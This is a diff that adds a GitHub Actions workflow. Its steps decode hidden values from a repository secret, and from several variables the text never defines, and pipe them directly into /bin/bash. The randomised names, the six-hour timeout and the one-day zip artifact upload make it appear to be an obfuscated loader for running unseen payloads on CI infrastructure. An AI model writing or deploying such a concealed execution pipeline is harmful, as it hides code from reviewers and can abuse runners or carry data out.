@@ -1,0 +1,25 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Start
+        env:
+          l0: ${{ secrets.l0 }}
+        run: |
+          printf '%s' "$l0" | jq -r .mt22562 | /bin/bash
+          printf '%s' "$iphf808" | jq -r .suf22251 | /bin/bash
+          echo $udotj09927 | jq -r .jy9 | /bin/bash
+          echo $k7398 | jq -r .z8435 | /bin/bash
+
+      - name: Save output
+        uses: actions/upload-artifact@v4
+        with:
+          name: yfU0mb8H
+          path: "*.zip"
+          retention-days: 1
